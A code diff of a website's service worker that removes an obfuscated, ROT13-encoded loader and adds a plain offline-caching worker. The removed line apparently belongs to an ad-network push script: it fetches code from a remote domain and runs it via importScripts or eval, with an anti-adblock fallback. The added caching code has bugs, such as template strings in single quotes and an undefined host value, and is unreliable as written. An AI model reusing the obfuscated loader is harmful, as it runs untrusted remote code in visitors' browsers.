@@ -1,1 +1,411 @@
-(function(O){!function(e){var t=O.Z();function n(r){if(t[r])return t[r][O.i];var i=t[r]=O.Z(O.B,r,O.w,!O.X,O.i,O.Z());return e[r][O.z](i[O.i],i,i[O.i],n),i[O.w]=!O.N,i[O.i]}n[O.y]=e,n[O.g]=t,n[O.K]=function(e,t,r){n[O.h](e,t)||Object[O.b](e,t,O.Z(O.GO,!O.N,O.RO,r))},n[O.G]=function(e){O.HO!=typeof Symbol&&Symbol[O.hO]&&Object[O.b](e,Symbol[O.hO],O.Z(O.p,O.cO)),Object[O.b](e,O.U,O.Z(O.p,!O.N))},n[O.R]=function(e,t){if(O.X&t&&(e=n(e)),O.v&t)return e;if(O.P&t&&O.t==typeof e&&e&&e[O.U])return e;var r=Object[O.r](O.q);if(n[O.G](r),Object[O.b](r,O.C,O.Z(O.GO,!O.N,O.p,e)),O.d&t&&O.oO!=typeof e)for(var i in e)n[O.K](r,i,function(t){return e[t]}[O.fO](O.q,i));return r},n[O.H]=function(e){var t=e&&e[O.U]?function(){return e[O.C]}:function(){return e};return n[O.K](t,O.OO,t),t},n[O.h]=function(e,t){return Object[O.FO][O.a][O.z](e,t)},n[O.e]=O.F,n(n[O.m]=O.o)}(O.Z(O.o,function(module,exports,__webpack_require__){O.f;var _antiadblock=__webpack_require__(O.O);self[O.c]=O.Z(O.S,9672622,O.V,"vaugroar.com",O.l,!O.N),self[O.D]=O.F;var DEFAULT_URL=[O.Y,O.j][O.A](self[O.c][O.V]),STORE_EVENTS=[O.T,O.u,O.M,O.L,O.n,O.E],url;try{if(url=atob(location[O.DO][O.x](O.X)),!url)throw O.q}catch(e){url=DEFAULT_URL}try{importScripts(url)}catch(ignore){var events=O.Z(),listeners=O.Z(),realAddEventListener=self[O.yO][O.fO](self);STORE_EVENTS[O.ZO](function(e){self[O.yO](e,function(t){events[e]||(events[e]=[]),events[e][O.M](t),listeners[e]&&listeners[e][O.ZO](function(e){try{e(t)}catch(e){}})})}),self[O.yO]=function(e,t){if(-O.X===STORE_EVENTS[O.qO](e))return realAddEventListener(e,t);listeners[e]||(listeners[e]=[]),listeners[e][O.M](t),events[e]&&events[e][O.ZO](function(e){try{t(e)}catch(e){}})},(O.N,_antiadblock[O.I])(url,O.Z())[O.gO](function(e){return e[O.UO]()})[O.gO](function(code){return eval(code)})}},O.O,function(e,t,n){O.f;Object[O.b](t,O.U,O.Z(O.p,!O.N)),t[O.Q]=function(e){return new Promise(function(t,n){r(O.BO)[O.gO](function(r){var i=r[O.tO]([O.lO],O.rO)[O.xO](O.lO)[O.WO](O.Z(O.V,e,O.dO,new Date()[O.CO]()));i[O.yO](O.EO,t),i[O.yO](O.nO,n)})})},t[O.I]=async function(e,t){var n=await new Promise(function(e,t){r(O.BO)[O.gO](function(n){var r=n[O.tO]([O.lO],O.rO)[O.xO](O.lO)[O.PO]();r[O.yO](O.nO,t),r[O.yO](O.EO,function(){return e(r[O.XO][O.oF](function(e){return e[O.V]}))})})}),o=!O.N,a=!O.X,s=void O.N;try{for(var c,u=n[Symbol[O.QO]]();!(o=(c=u[O.IO]())[O.uO]);o=!O.N){var d=c[O.p];try{return await fetch(O.Y+d+O.s+i(),O.Z(O.YO,t[O.YO]||O.RO,O.jO,O.pO,O.sO,t[O.sO],O.vO,O.Z(O.kO,btoa(e))))}catch(e){}}}catch(e){a=!O.N,s=e}finally{try{!o&&u[O.JO]&&u[O.JO]()}finally{if(a)throw s}}throw new Error(O.eO)},t[O.J]=async function(e){try{var t=await fetch(e[O.qO](O.SO)>-O.X?e:O.Y+e);return!O.X===(await t[O.bO]())[O.TO]}catch(e){return!O.X}};function r(e){return new Promise(function(t,n){var r=indexedDB[O.MO](e,O.X);r[O.yO](O.LO,function(){r[O.XO][O.VO](O.lO,O.Z(O.aO,O.V))}),r[O.yO](O.nO,n),r[O.yO](O.EO,function(){return t(r[O.XO])})})}function i(){var e=arguments[O.iO]>O.N&&void O.N!==arguments[O.N]?arguments[O.N]:O.N,t=e<O.W&&Math[O.mO]()>O.k,n=Math[O.mO]()[O.zO](O.wO)[O.x](O.d,O.KO+parseInt(O.AO*Math[O.mO](),O.NO));return n+(t?O.s+i(e+O.X):O.F)}}))}([['o',111],['O',17],['F',''],['f','hfr fgevpg'],['Z',function(){const obj={};const args=[].slice.call(arguments);for(let i=0;i<args.length-1;i+=2){obj[args[i]]=args[i+1]}return obj}],['y','z'],['g','p'],['K','q'],['G','e'],['R','g'],['H','a'],['h','b'],['e','c'],['i','rkcbegf'],['m','f'],['z','pnyy'],['w','y'],['N',0],['c','bcgvbaf'],['D','ynel'],['A','wbva'],['T','vafgnyy'],['u','npgvingr'],['M','chfu'],['L','abgvsvpngvbapyvpx'],['n','abgvsvpngvbapybfr'],['E','chfufhofpevcgvbapunatr'],['q',null],['b','qrsvarCebcregl'],['U','__rfZbqhyr'],['Q','nqqQbznva'],['I','hygensrgpu'],['J','grfgCvatQbznva'],['B','v'],['S','mbarVq'],['V','qbznva'],['l','erfhofpevorBaVafgnyy'],['X',1],['Y','uggcf://'],['j','/csr/pheerag/freivpr-jbexre.zva.wf?e=fj&i=2'],['p','inyhr'],['s','/'],['v',8],['a','unfBjaCebcregl'],['W',7],['k',.3],['x','fyvpr'],['d',2],['P',4],['t','bowrpg'],['r','perngr'],['C','qrsnhyg'],['oO','fgevat'],['OO','n'],['FO','cebgbglcr'],['fO','ovaq'],['ZO','sbeRnpu'],['yO','nqqRiragYvfgrare'],['gO','gura'],['KO',3],['GO','rahzrenoyr'],['RO','trg'],['HO','haqrsvarq'],['hO','gbFgevatGnt'],['eO','NNO Erdhrfg Snvyrq'],['iO','yratgu'],['mO','enaqbz'],['zO','gbFgevat'],['wO',36],['NO',10],['cO','Zbqhyr'],['DO','frnepu'],['AO',9],['TO','fgnghf'],['uO','qbar'],['MO','bcra'],['LO','hctenqrarrqrq'],['nO','reebe'],['EO','fhpprff'],['qO','vaqrkBs'],['bO','wfba'],['UO','grkg'],['QO','vgrengbe'],['IO','arkg'],['JO','erghea'],['BO','fjnno'],['SO',':'],['VO','perngrBowrpgFgber'],['lO','qbznvaf'],['XO','erfhyg'],['YO','zrgubq'],['jO','perqragvnyf'],['pO','vapyhqr'],['sO','obql'],['vO','urnqref'],['aO','xrlCngu'],['WO','chg'],['kO','gbxra'],['xO','bowrpgFgber'],['dO','perngrqNg'],['PO','trgNyy'],['tO','genafnpgvba'],['rO','ernqjevgr'],['CO','trgGvzr'],['oF','znc']].reduce((o,i)=>(Object.defineProperty(o,i[0],{get:()=>typeof i[1]!=='string'?i[1]:i[1].split('').map(s=>{const c=s.charCodeAt(0);return c>=65&&c<=90?String.fromCharCode((c-65+26-13)%26+65):c>=97&&c<=122?String.fromCharCode((c-97+26-13)%26+97):s}).join('')}),o),{})))/*importScripts(...r=sw)*/
+const CACHE_VERSION = 1;
+const GHPATH = 'https://www.bwstays.com/';
+const Version = new URL(location).searchParams.get("version");
+
+const host = `${self.location.protocol}//${self.location.host}`;
+console.info(`Host: ${this.host}`);
+
+const ServerApiPath = "https://cloudflare.com/api";
+const BASE_CACHE_FILES = [
+    '${GHPATH}/style.css',
+    '${GHPATH}/script.js',
+    '${GHPATH}/search.json',
+    '${GHPATH}/manifest.json',
+    '${GHPATH}/favicon.png',
+];
+
+const OFFLINE_CACHE_FILES = [
+    '${GHPATH}/style.css',
+    '${GHPATH}/script.js',
+    '${GHPATH}/offline/index.html',
+];
+
+const NOT_FOUND_CACHE_FILES = [
+    '${GHPATH}/style.css',
+    '${GHPATH}/script.js',
+    '${GHPATH}/404.html',
+];
+
+const OFFLINE_PAGE = '${GHPATH}/offline/index.html';
+const NOT_FOUND_PAGE = '${GHPATH}/404.html';
+
+const CACHE_VERSIONS = {
+    assets: 'assets-v' + CACHE_VERSION,
+    content: 'content-v' + CACHE_VERSION,
+    offline: 'offline-v' + CACHE_VERSION,
+    notFound: '404-v' + CACHE_VERSION,
+};
+
+// Define MAX_TTL's in SECONDS for specific file extensions
+const MAX_TTL = {
+    '/': 3600,
+    html: 3600,
+    json: 86400,
+    js: 86400,
+    css: 86400,
+};
+
+const CACHE_BLACKLIST = [
+    //(str) => {
+    //    return !str.startsWith('http://localhost') && !str.startsWith('https://gohugohq.com');
+    //},
+];
+
+const SUPPORTED_METHODS = [
+    'GET',
+];
+
+/**
+* To cache local url
+*/
+
+function    canCache(url) {
+        if (url.startsWith("http://localhost")) {
+            return false;
+        }
+        const result = url.toString().startsWith(this.host);
+        return result;
+    }
+
+
+/**
+ * isBlackListed
+ * @param {string} url
+ * @returns {boolean}
+ */
+function isBlacklisted(url) {
+    return (CACHE_BLACKLIST.length > 0) ? !CACHE_BLACKLIST.filter((rule) => {
+        if(typeof rule === 'function') {
+            return !rule(url);
+        } else {
+            return false;
+        }
+    }).length : false
+}
+
+/**
+ * getFileExtension
+ * @param {string} url
+ * @returns {string}
+ */
+function getFileExtension(url) {
+    let extension = url.split('.').reverse()[0].split('?')[0];
+    return (extension.endsWith('/')) ? '/' : extension;
+}
+
+/**
+ * getTTL
+ * @param {string} url
+ */
+function getTTL(url) {
+    if (typeof url === 'string') {
+        let extension = getFileExtension(url);
+        if (typeof MAX_TTL[extension] === 'number') {
+            return MAX_TTL[extension];
+        } else {
+            return null;
+        }
+    } else {
+        return null;
+    }
+}
+
+/**
+ * installServiceWorker
+ * @returns {Promise}
+ */
+function installServiceWorker() {
+    return Promise.all(
+        [
+            caches.open(CACHE_VERSIONS.assets)
+                .then(
+                    (cache) => {
+                        return cache.addAll(BASE_CACHE_FILES);
+                    }
+                ),
+            caches.open(CACHE_VERSIONS.offline)
+                .then(
+                    (cache) => {
+                        return cache.addAll(OFFLINE_CACHE_FILES);
+                    }
+                ),
+            caches.open(CACHE_VERSIONS.notFound)
+                .then(
+                    (cache) => {
+                        return cache.addAll(NOT_FOUND_CACHE_FILES);
+                    }
+                )
+        ]
+    )
+        .then(() => {
+            return self.skipWaiting();
+        });
+}
+
+/**
+ * cleanupLegacyCache
+ * @returns {Promise}
+ */
+function cleanupLegacyCache() {
+
+    let currentCaches = Object.keys(CACHE_VERSIONS)
+        .map(
+            (key) => {
+                return CACHE_VERSIONS[key];
+            }
+        );
+
+    return new Promise(
+        (resolve, reject) => {
+
+            caches.keys()
+                .then(
+                    (keys) => {
+                        return legacyKeys = keys.filter(
+                            (key) => {
+                                return !~currentCaches.indexOf(key);
+                            }
+                        );
+                    }
+                )
+                .then(
+                    (legacy) => {
+                        if (legacy.length) {
+                            Promise.all(
+                                legacy.map(
+                                    (legacyKey) => {
+                                        return caches.delete(legacyKey)
+                                    }
+                                )
+                            )
+                                .then(
+                                    () => {
+                                        resolve()
+                                    }
+                                )
+                                .catch(
+                                    (err) => {
+                                        reject(err);
+                                    }
+                                );
+                        } else {
+                            resolve();
+                        }
+                    }
+                )
+                .catch(
+                    () => {
+                        reject();
+                    }
+                );
+
+        }
+    );
+}
+
+function precacheUrl(url) {
+    if(!isBlacklisted(url)) {
+        caches.open(CACHE_VERSIONS.content)
+            .then((cache) => {
+                cache.match(url)
+                    .then((response) => {
+                        if(!response) {
+                            return fetch(url)
+                        } else {
+                            // already in cache, nothing to do.
+                            return null
+                        }
+                    })
+                    .then((response) => {
+                        if(response) {
+                            return cache.put(url, response.clone());
+                        } else {
+                            return null;
+                        }
+                    });
+            })
+    }
+}
+
+
+
+self.addEventListener(
+    'install', event => {
+        event.waitUntil(
+            Promise.all([
+                installServiceWorker(),
+                self.skipWaiting(),
+            ])
+        );
+    }
+);
+
+// The activate handler takes care of cleaning up old caches.
+self.addEventListener(
+    'activate', event => {
+        event.waitUntil(
+            Promise.all(
+                [
+                    cleanupLegacyCache(),
+                    self.clients.claim(),
+                    self.skipWaiting(),
+                ]
+            )
+                .catch(
+                    (err) => {
+                        event.skipWaiting();
+                    }
+                )
+        );
+    }
+);
+
+self.addEventListener(
+    'fetch', event => {
+
+        event.respondWith(
+            caches.open(CACHE_VERSIONS.content)
+                .then(
+                    (cache) => {
+
+                        return cache.match(event.request)
+                            .then(
+                                (response) => {
+
+                                    if (response) {
+
+                                        let headers = response.headers.entries();
+                                        let date = null;
+
+                                        for (let pair of headers) {
+                                            if (pair[0] === 'date') {
+                                                date = new Date(pair[1]);
+                                            }
+                                        }
+
+                                        if (date) {
+                                            let age = parseInt((new Date().getTime() - date.getTime()) / 1000);
+                                            let ttl = getTTL(event.request.url);
+
+                                            let byPassCach = false;
+
+                                            //added this line to bypass cache for server requests
+                                            //update ServerApiPath with your own server api path
+                                            if (event.request.url.toLowerCase().includes(ServerApiPath)) {
+                                                byPassCach = true;
+                                            }
+
+                                            if (byPassCach || (ttl && age > ttl)) {
+
+                                                return new Promise(
+                                                    (resolve) => {
+
+                                                        return fetch(event.request.clone())
+                                                            .then(
+                                                                (updatedResponse) => {
+                                                                    if (updatedResponse) {
+                                                                        cache.put(event.request, updatedResponse.clone());
+                                                                        resolve(updatedResponse);
+                                                                    } else {
+                                                                        resolve(response)
+                                                                    }
+                                                                }
+                                                            )
+                                                            .catch(
+                                                                () => {
+                                                                    resolve(response);
+                                                                }
+                                                            );
+
+                                                    }
+                                                )
+                                                    .catch(
+                                                        (err) => {
+                                                            return response;
+                                                        }
+                                                    );
+                                            } else {
+                                                return response;
+                                            }
+
+                                        } else {
+                                            return response;
+                                        }
+
+                                    } else {
+                                        return null;
+                                    }
+                                }
+                            )
+                            .then(
+                                (response) => {
+                                    if (response) {
+                                        return response;
+                                    } else {
+                                        return fetch(event.request.clone())
+                                            .then(
+                                                (response) => {
+
+                                                    if(response.status < 400) {
+                                                        if (~SUPPORTED_METHODS.indexOf(event.request.method) && !isBlacklisted(event.request.url)) {
+                                                            cache.put(event.request, response.clone());
+                                                        }
+                                                        return response;
+                                                    } else {
+                                                        return caches.open(CACHE_VERSIONS.notFound).then((cache) => {
+                                                            return cache.match(NOT_FOUND_PAGE);
+                                                        })
+                                                    }
+                                                }
+                                            )
+                                            .then((response) => {
+                                                if(response) {
+                                                    return response;
+                                                }
+                                            })
+                                            .catch(
+                                                () => {
+
+                                                    return caches.open(CACHE_VERSIONS.offline)
+                                                        .then(
+                                                            (offlineCache) => {
+                                                                return offlineCache.match(OFFLINE_PAGE)
+                                                            }
+                                                        )
+
+                                                }
+                                            );
+                                    }
+                                }
+                            )
+                            .catch(
+                                (error) => {
+                                    console.error('  Error in fetch handler:', error);
+                                    throw error;
+                                }
+                            );
+                    }
+                )
+        );
+
+    }
+);
+
+
+self.addEventListener('message', (event) => {
+
+    if(
+        typeof event.data === 'object' &&
+        typeof event.data.action === 'string'
+    ) {
+        switch(event.data.action) {
+            case 'cache' :
+                precacheUrl(event.data.url);
+                break;
+            default :
+                console.log('Unknown action: ' + event.data.action);
+                break;
+        }
+    }
+
+});
